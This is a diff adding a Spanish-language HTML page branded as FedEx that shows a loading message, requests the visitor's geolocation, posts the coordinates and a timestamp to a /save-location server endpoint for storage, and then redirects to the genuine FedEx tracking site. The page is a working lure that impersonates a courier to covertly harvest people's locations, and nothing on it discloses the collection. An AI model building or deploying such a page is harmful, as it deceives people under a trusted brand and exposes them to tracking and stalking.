@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fedex</title>
+</head>
+<style>
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+    }
+    
+    #loading-message {
+        font-size: 24px;
+        color: #333;
+        text-align: center;
+        font-weight: bold;
+    }
+</style>
+
+<body>
+    <h1 id="loading-message">FedEx... Cargando</h1>
+
+    <script>
+    window.onload = function() {
+        // Mostrar mensaje de carga al cargar la página
+        const loadingMessage = document.getElementById("loading-message");
+        
+        // Solicitar la ubicación del usuario
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Crear un objeto con los datos de ubicación
+                const locationData = {
+                    latitude: latitude,
+                    longitude: longitude,
+                    timestamp: new Date().toISOString()
+                };
+
+                // Enviar los datos al servidor para guardarlos en el archivo JSON
+                fetch('/save-location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(locationData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data.message);  // Mostrar mensaje de éxito en consola
+                })
+                .catch(error => {
+                    console.error('Error al enviar los datos:', error);
+                });
+
+                // Esperar 3 segundos antes de redirigir
+                setTimeout(function() {
+                    // Cambiar el mensaje de carga
+                    loadingMessage.textContent = "Redirigiendo a FedEx...";
+                    // Redirigir a la URL de FedEx
+                    window.location.href = "https://www.fedex.com/es-mx/tracking.html";
+                }, 3000);
+            }, function(error) {
+                console.error("Error al obtener la ubicación: " + error.message);
+                loadingMessage.textContent = "No se pudo obtener la ubicación.";
+            });
+        } else {
+            console.log("La geolocalización no está disponible en este navegador.");
+            loadingMessage.textContent = "La geolocalización no está disponible.";
+        }
+    }
+    </script>
+</body>
+</html>
